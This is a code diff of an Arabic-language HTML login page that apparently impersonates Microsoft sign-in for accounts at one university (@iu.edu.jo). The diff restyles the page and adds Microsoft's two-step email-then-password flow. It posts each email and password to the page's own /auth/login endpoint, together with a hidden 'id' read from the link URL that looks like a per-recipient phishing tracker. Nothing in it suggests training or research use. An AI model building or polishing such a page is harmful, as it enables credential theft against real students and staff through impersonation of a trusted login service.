@@ -5,12 +5,13 @@
   <title>تسجيل الدخول</title>
   <style>
     body {
-      font-family: 'Segoe UI', sans-serif;
+      font-family: 'Segoe UI', Tahoma, sans-serif;
       background: #f3f2f1;
       display: flex;
       align-items: center;
       justify-content: center;
       height: 100vh;
+      margin: 0;
     }
     .login-box {
       background: #fff;
@@ -21,35 +22,25 @@
       text-align: center;
     }
     .login-box img {
-      width: 80px;
+      width: 100px;
       margin-bottom: 20px;
     }
     .login-box h2 {
       margin-bottom: 20px;
       color: #333;
-    }
-    .input-group {
-      position: relative;
-      margin: 10px 0;
+      font-size: 18px;
     }
     .form-control {
       width: 100%;
-      padding: 10px 40px 10px 10px;
+      padding: 12px;
+      margin: 10px 0;
       border: 1px solid #ccc;
       border-radius: 4px;
-      font-size: 14px;
+      box-sizing: border-box;
+      text-align: left;
       direction: ltr;
     }
-    .input-icon {
-      position: absolute;
-      top: 50%;
-      right: 10px;
-      transform: translateY(-50%);
-      color: #666;
-      font-size: 16px;
-      cursor: pointer;
-    }
-    button {
+    .btn {
       background: #0067b8;
       color: #fff;
       border: none;
@@ -58,20 +49,18 @@
       border-radius: 4px;
       cursor: pointer;
       font-size: 16px;
-      margin-top: 10px;
     }
-    button:hover {
+    .btn:hover {
       background: #005a9e;
     }
-    .forgot {
+    .footer-link {
       margin-top: 15px;
-      font-size: 14px;
-    }
-    .forgot a {
+      display: block;
       color: #0067b8;
       text-decoration: none;
+      font-size: 14px;
     }
-    .forgot a:hover {
+    .footer-link:hover {
       text-decoration: underline;
     }
   </style>
@@ -80,35 +69,41 @@
   <div class="login-box">
     <img src="https://logincdn.msftauth.net/shared/5/images/microsoft_logo.svg" alt="Microsoft Logo">
     <h2>تسجيل الدخول بإستخدام بريدك الجامعي</h2>
-    <form action="/auth/login" method="POST">
-      <div class="input-group">
-        <input type="email" name="email" class="form-control" placeholder="البريد الإلكتروني" required>
-        <span class="input-icon">@</span>
-      </div>
-      <div class="input-group">
-        <input type="password" id="password" name="password" class="form-control" placeholder="كلمة المرور" required>
-        <span class="input-icon" onclick="togglePassword()">👁</span>
-      </div>
-      <input type="hidden" id="linkId" name="id">
-      <button type="submit">تسجيل الدخول</button>
-    </form>
-    <div class="forgot">
-      <a href="#">هل نسيت كلمة المرور؟</a>
+    
+    <!-- الخطوة الأولى: البريد -->
+    <div id="step-email">
+      <input type="email" id="email" class="form-control" placeholder="البريد الإلكتروني" required>
+      <button class="btn" onclick="validateEmail()">التالي</button>
     </div>
+
+    <!-- الخطوة الثانية: كلمة المرور -->
+    <form id="step-password" action="/auth/login" method="POST" style="display:none;">
+      <input type="hidden" name="email" id="hiddenEmail">
+      <input type="password" name="password" class="form-control" placeholder="كلمة المرور" required>
+      <input type="hidden" id="linkId" name="id">
+      <button type="submit" class="btn">تسجيل الدخول</button>
+      <a href="#" class="footer-link">هل نسيت كلمة المرور؟</a>
+    </form>
   </div>
 
   <script>
-    // قراءة id من الرابط
+    // حفظ id في hidden field
     const params = new URLSearchParams(window.location.search);
     const linkId = params.get('id');
     if (linkId) {
       document.getElementById('linkId').value = linkId;
     }
 
-    // إظهار/إخفاء كلمة المرور
-    function togglePassword() {
-      const passField = document.getElementById("password");
-      passField.type = passField.type === "password" ? "text" : "password";
+    // التحقق من البريد
+    function validateEmail() {
+      const email = document.getElementById('email').value.trim();
+      if (email.endsWith('@iu.edu.jo')) {
+        document.getElementById('hiddenEmail').value = email;
+        document.getElementById('step-email').style.display = 'none';
+        document.getElementById('step-password').style.display = 'block';
+      } else {
+        alert('❌ يجب إدخال بريد ينتهي بـ @iu.edu.jo');
+      }
     }
   </script>
 </body>
